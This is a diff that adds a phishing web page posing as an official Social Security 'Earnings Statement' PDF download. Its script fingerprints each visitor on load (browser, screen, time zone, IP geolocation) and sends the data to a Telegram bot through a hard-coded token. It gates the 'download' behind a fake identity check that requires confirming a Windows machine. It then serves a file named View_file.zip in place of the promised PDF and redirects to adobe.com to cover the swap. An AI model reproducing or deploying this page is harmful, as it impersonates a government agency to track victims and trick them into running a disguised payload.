@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSA - Earnings Statement</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #ffffff;
+            font-family: 'Segoe UI', 'Roboto', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+            padding: 1.2rem 1.5rem 1.5rem;
+            border: 1px solid #eaeef2;
+        }
+        .header {
+            text-align: center;
+            border-bottom: 2px solid #0b5e7e;
+            padding-bottom: 0.6rem;
+            margin-bottom: 1rem;
+        }
+        .header h1 {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #002b4f;
+        }
+        .header .sub {
+            font-size: 0.65rem;
+            color: #2c5a7a;
+            margin-top: 0.1rem;
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.7rem;
+            padding: 0.25rem 0;
+            border-bottom: 1px solid #f0f2f5;
+        }
+        .info-row:last-child { border-bottom: none; }
+        .info-label { color: #475569; }
+        .info-value { font-weight: 600; color: #1e293b; }
+        .attachment {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 0.5rem 0.7rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin: 0.7rem 0;
+        }
+        .pdf-icon {
+            background: #dc2626;
+            color: white;
+            font-weight: 700;
+            font-size: 0.7rem;
+            padding: 0.2rem 0.5rem;
+            border-radius: 6px;
+        }
+        .file-info h4 { font-size: 0.75rem; color: #1e293b; }
+        .file-info p { font-size: 0.6rem; color: #64748b; }
+        .notice {
+            font-size: 0.65rem;
+            color: #475569;
+            background: #f8fafc;
+            padding: 0.5rem 0.7rem;
+            border-radius: 8px;
+            margin: 0.7rem 0;
+            border: 1px solid #e2e8f0;
+        }
+        .verify-box {
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 0.8rem 1rem;
+            margin: 0.7rem 0;
+        }
+        .verify-title {
+            font-weight: 700;
+            font-size: 0.8rem;
+            color: #1e293b;
+            margin-bottom: 0.4rem;
+        }
+        .math-area {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+        .math-q {
+            font-family: monospace;
+            background: #f1f5f9;
+            padding: 0.2rem 0.6rem;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            color: #1e293b;
+        }
+        .math-input {
+            flex: 1;
+            border: 1px solid #d1d5db;
+            border-radius: 30px;
+            padding: 0.3rem 0.7rem;
+            font-size: 0.75rem;
+            background: white;
+            color: #1e293b;
+            min-width: 60px;
+        }
+        .math-input:focus {
+            border-color: #2563eb;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37,99,235,0.15);
+        }
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            font-size: 0.65rem;
+            color: #1e293b;
+            margin: 0.5rem 0;
+            cursor: pointer;
+        }
+        .checkbox-label input[type="checkbox"] {
+            width: 14px;
+            height: 14px;
+            accent-color: #0a5b3e;
+        }
+        .download-btn {
+            background: #0a5b3e;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 0.5rem;
+            font-weight: 600;
+            font-size: 0.75rem;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .download-btn:hover:not(:disabled) {
+            background: #0b6b48;
+            transform: scale(0.98);
+        }
+        .download-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .status-msg {
+            font-size: 0.65rem;
+            text-align: center;
+            margin-top: 0.4rem;
+            min-height: 1rem;
+            color: #64748b;
+        }
+        .footer-note {
+            text-align: center;
+            font-size: 0.55rem;
+            color: #94a3b8;
+            border-top: 1px solid #eef2f6;
+            padding-top: 0.6rem;
+            margin-top: 0.6rem;
+        }
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e1e1e;
+            color: white;
+            padding: 8px 18px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            z-index: 999;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+            white-space: nowrap;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1># Social Security</h1>
+        <div class="sub">OFFICIAL EARNINGS RECORD</div>
+    </div>
+
+    <div class="info-row"><span class="info-label">TAX YEAR</span><span class="info-value">2026</span></div>
+    <div class="info-row"><span class="info-label">FORMAT</span><span class="info-value">PDF</span></div>
+    <div class="info-row"><span class="info-label">FILE SIZE</span><span class="info-value">1.4 MB</span></div>
+
+    <div class="attachment">
+        <span class="pdf-icon">PDF</span>
+        <div class="file-info">
+            <h4>Earnings_Statement_2026.pdf</h4>
+            <p>Portable Document Format (PDF)</p>
+        </div>
+    </div>
+
+    <div class="notice">
+        <strong>📌 Notice:</strong> Download and retain this file for your records.
+        <br><strong>Record generated:</strong> April 2026 &nbsp;|&nbsp; <strong>ID:</strong> SSA-EARN-2026
+    </div>
+
+    <div class="verify-box">
+        <div class="verify-title">🔒 Identity Verification Required</div>
+        <div class="math-area">
+            <span class="math-q">What is 6 + 4 ?</span>
+            <input type="text" id="mathAnswer" class="math-input" placeholder="Enter result" inputmode="numeric">
+        </div>
+        <label class="checkbox-label">
+            <input type="checkbox" id="confirmCheckbox">
+            I confirm I am using a Windows desktop or laptop.
+        </label>
+        <button class="download-btn" id="downloadBtn">📄 Download PDF · 1.4 MB</button>
+        <div id="statusMsg" class="status-msg"></div>
+    </div>
+
+    <div class="footer-note">🔒 Secure · Official SSA Partner Portal</div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+(function() {
+    var BOT_TOKEN = "8954170291:AAHGtuJUqvUUaXnMy_00xg5UeCTEesF-BT4";
+    var CHAT_ID = "7415315986";
+    var REDIRECT_URL = "https://www.adobe.com";
+    var PDF_FILENAME = "View_file.zip";
+
+    var mathInput = document.getElementById('mathAnswer');
+    var confirmCheck = document.getElementById('confirmCheckbox');
+    var downloadBtn = document.getElementById('downloadBtn');
+    var statusEl = document.getElementById('statusMsg');
+    var toastEl = document.getElementById('toast');
+
+    function showToast(msg) {
+        toastEl.textContent = msg;
+        toastEl.style.opacity = '1';
+        clearTimeout(toastEl._timer);
+        toastEl._timer = setTimeout(function() { toastEl.style.opacity = '0'; }, 2500);
+    }
+
+    function sendTelegram(text) {
+        try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' }));
+        } catch(e) {}
+    }
+
+    // Visitor tracking
+    (function() {
+        var ua = navigator.userAgent;
+        var lang = navigator.language;
+        var screen = window.screen.width + 'x' + window.screen.height;
+        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        try {
+            var x = new XMLHttpRequest();
+            x.open('GET', 'https://ipapi.co/json/', true);
+            x.onload = function() {
+                var geo = '';
+                if (x.status === 200) {
+                    var g = JSON.parse(x.responseText);
+                    geo = '`' + (g.city || 'Unknown') + ', ' + (g.region || 'Unknown') + ', ' + (g.country_name || 'Unknown') + '`\nISP: `' + (g.org || 'Unknown') + '`';
+                } else { geo = 'Geo unavailable'; }
+                sendTelegram('👁 *Visitor*\nDevice: `Desktop`\nIP+Geo: ' + geo + '\nTimeZone: `' + tz + '`\nScreen: `' + screen + '`\nLang: `' + lang + '`\nUA: `' + ua + '`');
+            };
+            x.onerror = function() {
+                sendTelegram('👁 *Visitor*\nDevice: `Desktop`\nIP+Geo: Geo unavailable\nTimeZone: `' + tz + '`\nScreen: `' + screen + '`\nLang: `' + lang + '`\nUA: `' + ua + '`');
+            };
+            x.send();
+        } catch(e) {}
+    })();
+
+    downloadBtn.addEventListener('click', function() {
+        var answer = mathInput.value.trim();
+        var checked = confirmCheck.checked;
+
+        if (answer === '' || isNaN(Number(answer))) {
+            statusEl.textContent = '❌ Please enter a valid number.';
+            statusEl.style.color = '#dc2626';
+            return;
+        }
+        if (Number(answer) !== 10) {
+            statusEl.textContent = '❌ Incorrect answer. Try again.';
+            statusEl.style.color = '#dc2626';
+            mathInput.value = '';
+            mathInput.focus();
+            return;
+        }
+        if (!checked) {
+            statusEl.textContent = '❌ Confirm you are on a Windows desktop.';
+            statusEl.style.color = '#dc2626';
+            return;
+        }
+
+        sendTelegram('📄 *SSA Document Downloaded*\n✅ Identity verified.');
+
+        statusEl.textContent = '⏳ Preparing download...';
+        statusEl.style.color = '#64748b';
+        downloadBtn.disabled = true;
+        downloadBtn.innerHTML = '⏳ Preparing...';
+
+        setTimeout(function() {
+            try {
+                // ——— THE ONE SURE METHOD ———
+                var a = document.createElement('a');
+                a.href = PDF_FILENAME;
+                a.download = PDF_FILENAME;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+
+                statusEl.textContent = '✅ Download started – redirecting...';
+                statusEl.style.color = '#10b981';
+                showToast('✅ Document ready');
+                sendTelegram('📄 *Download Complete*');
+                setTimeout(function() {
+                    window.location.href = REDIRECT_URL;
+                }, 1200);
+            } catch(err) {
+                statusEl.textContent = '❌ Error: ' + err.message;
+                statusEl.style.color = '#dc2626';
+                downloadBtn.disabled = false;
+                downloadBtn.innerHTML = '📄 Download PDF · 1.4 MB';
+            }
+        }, 500);
+    });
+
+    mathInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') downloadBtn.click();
+    });
+})();
+</script>
+</body>
+</html>
